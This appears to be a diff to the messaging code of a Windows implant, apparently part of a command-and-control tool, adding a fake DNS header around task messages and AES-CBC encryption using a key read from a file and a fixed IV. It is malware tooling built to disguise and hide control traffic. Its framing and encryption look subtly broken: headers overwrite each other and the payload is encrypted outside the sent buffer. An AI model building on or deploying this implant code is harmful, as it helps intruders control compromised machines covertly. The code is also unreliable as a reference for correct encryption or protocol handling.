@@ -74,9 +74,12 @@ static BOOL RecvAll(SOCKET sock, CHAR* buf, INT len)
 	return TRUE;
 }
 
-BOOL SendTlvMessage(SOCKET sock, DWORD type, DWORD payloadLength, CONST PBYTE payload)
+BOOL SendTlvMessage(SOCKET sock, USHORT taskId, DWORD type, DWORD payloadLength, CONST PBYTE payload)
 {
-	PBYTE msg = ImplantHeapAlloc(TLV_HEADER_SIZE + payloadLength);
+	DWORD lenRequired = DNS_HEADER_SIZE + TLV_HEADER_SIZE + payloadLength;
+	lenRequired += (16 - (lenRequired % 16)); // pad to block size for encryption
+	PBYTE msg = ImplantHeapAlloc(lenRequired);
+	ZeroMemory(msg, lenRequired);
 
 	ASSERT(sock != INVALID_SOCKET);
 
@@ -84,7 +87,9 @@ BOOL SendTlvMessage(SOCKET sock, DWORD type, DWORD payloadLength, CONST PBYTE pa
 	memcpy(msg + TLV_LENGTH_FIELD_OFFSET, &payloadLength, sizeof(DWORD));
 	memcpy(msg + TLV_LENGTH_FIELD_OFFSET + sizeof(DWORD), payload, payloadLength);
 
-	if (!SendAll(sock, (CONST CHAR*)msg, TLV_HEADER_SIZE + payloadLength))
+	EncodeDNS(msg, taskId, type, payloadLength, payload);
+
+	if (!SendAll(sock, (CONST CHAR*)msg, lenRequired))
 	{
 		ImplantHeapFree(msg);
 		return FALSE;
@@ -97,6 +102,7 @@ BOOL SendTlvMessage(SOCKET sock, DWORD type, DWORD payloadLength, CONST PBYTE pa
 BOOL RecvMessage(SOCKET sock, TLV_MESSAGE* msg)
 {
 	PBYTE buff = ImplantHeapAlloc(MAX_MESSAGE_SIZE);
+	PBYTE out = NULL;
 	ASSERT(sock != INVALID_SOCKET);
 	ASSERT(msg != NULL);
 
@@ -110,8 +116,10 @@ BOOL RecvMessage(SOCKET sock, TLV_MESSAGE* msg)
 		return FALSE;
 	}
 
-	msg->type = *(DWORD*)(buff + TLV_TYPE_FIELD_OFFSET);
-	msg->length = *(DWORD*)(buff + TLV_LENGTH_FIELD_OFFSET);
+	DecodeDNS(buff, &out);
+
+	msg->type = *(DWORD*)(out + TLV_TYPE_FIELD_OFFSET);
+	msg->length = *(DWORD*)(out + TLV_LENGTH_FIELD_OFFSET);
 
 	if (msg->length >= MAX_MESSAGE_SIZE)
 	{
@@ -128,16 +136,10 @@ BOOL RecvMessage(SOCKET sock, TLV_MESSAGE* msg)
 			return FALSE;
 		}
 
-		if (!memcpy(msg->value,
-			buff + TLV_LENGTH_FIELD_OFFSET + sizeof(DWORD),
+		memcpy(msg->value,
+			out + TLV_LENGTH_FIELD_OFFSET + sizeof(DWORD),
 			msg->length
-			))
-		{
-			ImplantHeapFree(msg->value);
-			ImplantHeapFree(buff);
-			msg->value = NULL;
-			return FALSE;
-		}
+		);
 	}
 
 	ImplantHeapFree(buff);
@@ -154,4 +156,192 @@ VOID FreeTlvMessage(TLV_MESSAGE* msg)
 		ImplantHeapFree(msg->value);
 		msg->value = NULL;
 	}
+}
+
+BOOL EncodeDNS(PBYTE msg, USHORT taskId, DWORD type, DWORD payloadLength, PBYTE payload)
+{
+	USHORT dummyAnswer, dummyAuthority, dummyAdditional;
+	dummyAnswer = 0;
+	dummyAuthority = 0;
+	dummyAdditional = 0;
+
+	//memcpy(dest, src, size);
+	memcpy(msg, &taskId, sizeof(USHORT));
+	memcpy(msg + DNS_FLAGS_OFFSET, (USHORT*)&type, sizeof(USHORT));
+	memcpy(msg + DNS_LENGTH_OFFSET, (USHORT*)&payloadLength, sizeof(USHORT));
+	memcpy(msg + DNS_ANSWER_OFFSET, &dummyAnswer, sizeof(USHORT));
+	memcpy(msg + DNS_AUTHORITY_OFFSET, &dummyAuthority, sizeof(USHORT));
+	memcpy(msg + DNS_ADDITIONAL_OFFSET, &dummyAdditional, sizeof(USHORT));
+
+	Encrypt(payload, payloadLength);
+
+	return TRUE;
+}
+
+BOOL DecodeDNS(PBYTE buff, PBYTE* out)
+{
+	DWORD payloadLength = 0;
+	
+	//strip DNS header
+	payloadLength = *(DWORD*)(buff + DNS_LENGTH_OFFSET);
+	*out = buff + DNS_HEADER_SIZE;
+
+	//Decrypt payload of DNS message
+	return Decrypt(*out, &payloadLength);
+}
+
+//I used Gemini to write the Encrypt and Decrypt() functions
+BOOL Encrypt(PBYTE msg, DWORD msgLength) {
+	BCRYPT_ALG_HANDLE hAlg = NULL;
+	BCRYPT_KEY_HANDLE hKey = NULL;
+	NTSTATUS status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
+	PBYTE buff = ImplantHeapAlloc(KEY_BUFF_SIZE);
+	HANDLE keyFile = NULL;
+	BOOL ret = TRUE;
+	UCHAR ivInitial[IV_SIZE] = IV;
+	UCHAR ivBuff[IV_SIZE] = { 0 };
+	memcpy(ivBuff, ivInitial, IV_SIZE);
+
+	if (status != STATUS_SUCCESS)
+	{
+		ImplantHeapFree(buff);
+		return FALSE;
+	}
+
+	status = BCryptSetProperty(
+		hAlg,
+		BCRYPT_CHAINING_MODE,
+		(PBYTE)BCRYPT_CHAIN_MODE_CBC,
+		sizeof(BCRYPT_CHAIN_MODE_CBC),
+		0);
+	if (status != STATUS_SUCCESS)
+	{
+		ImplantHeapFree(buff);
+		return FALSE;
+	}
+
+	keyFile = CreateFileW(L"..\\key.bin", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (keyFile == INVALID_HANDLE_VALUE)
+	{
+		ret = FALSE;
+		goto cleanup;
+	}
+
+	if (!ReadFile(keyFile, buff, KEY_BUFF_SIZE, NULL, NULL))
+	{
+		ret = FALSE;
+		goto cleanup;
+	}
+
+	status = BCryptImportKey(hAlg, NULL, BCRYPT_KEY_DATA_BLOB, &hKey, NULL, 0, buff, KEY_BUFF_SIZE, 0);
+	if (status != STATUS_SUCCESS)
+	{
+		ret = FALSE;
+		goto cleanup;
+	}
+
+	status = BCryptEncrypt(hKey, msg, msgLength, NULL, ivBuff, IV_SIZE, msg, msgLength, &msgLength, BCRYPT_BLOCK_PADDING);
+	if (status != STATUS_SUCCESS)
+	{
+		ret = FALSE;
+		goto cleanup;
+	}
+
+cleanup:
+	if (hAlg != NULL)
+	{
+		BCryptCloseAlgorithmProvider(hAlg, 0);
+	}
+	if (hKey != NULL)
+	{
+		BCryptDestroyKey(hKey);
+	}
+	if (buff != NULL)
+	{
+		ImplantHeapFree(buff);
+	}
+	if (keyFile != NULL)
+	{
+		CloseHandle(keyFile);
+	}
+
+	return ret;
+}
+
+BOOL Decrypt(PBYTE msg, DWORD* msgLength) {
+	BCRYPT_ALG_HANDLE hAlg = NULL;
+	NTSTATUS status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
+	BCRYPT_KEY_HANDLE hKey = NULL;
+	PBYTE buff = ImplantHeapAlloc(KEY_BUFF_SIZE);
+	ULONG sizeRequired = 0;
+	HANDLE keyFile = NULL;
+	BOOL ret = TRUE;
+	UCHAR ivInitial[IV_SIZE] = IV;
+	UCHAR ivBuff[IV_SIZE] = { 0 };
+	memcpy(ivBuff, ivInitial, IV_SIZE);
+
+	if (status != STATUS_SUCCESS)
+	{
+		ret = FALSE;
+		goto cleanup;
+	}
+
+	keyFile = CreateFileW(L"..\\key.bin", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	if (keyFile == INVALID_HANDLE_VALUE)
+	{
+		ret = FALSE;
+		goto cleanup;
+	}
+
+	if (!ReadFile(keyFile, buff, KEY_BUFF_SIZE, NULL, NULL))
+	{
+		ret = FALSE;
+		goto cleanup;
+	}
+
+	status = BCryptImportKey(hAlg, NULL, BCRYPT_KEY_DATA_BLOB, &hKey, NULL, 0, buff, KEY_BUFF_SIZE, 0);
+	if (status != STATUS_SUCCESS)
+	{
+		ret = FALSE;
+		goto cleanup;
+	}
+
+	status = BCryptDecrypt(hKey, msg, *msgLength, NULL, ivBuff, IV_SIZE, NULL, 0, &sizeRequired, 0);
+	if (status != STATUS_SUCCESS)
+	{
+		ret = FALSE;
+		goto cleanup;
+	}
+
+	if (sizeRequired <= *msgLength)
+	{
+
+		status = BCryptDecrypt(hKey, msg, *msgLength, NULL, ivBuff, IV_SIZE, msg, sizeRequired, &sizeRequired, 0);
+		if (status != STATUS_SUCCESS)
+		{
+			ret = FALSE;
+			goto cleanup;
+		}
+		*msgLength = sizeRequired;
+	}
+
+cleanup:
+	if (hAlg != NULL)
+	{
+		BCryptCloseAlgorithmProvider(hAlg, 0);
+	}
+	if (hKey != NULL)
+	{
+		BCryptDestroyKey(hKey);
+	}
+	if (buff != NULL)
+	{
+		ImplantHeapFree(buff);
+	}
+	if (keyFile != NULL)
+	{
+		CloseHandle(keyFile);
+	}
+	
+	return ret;
 }
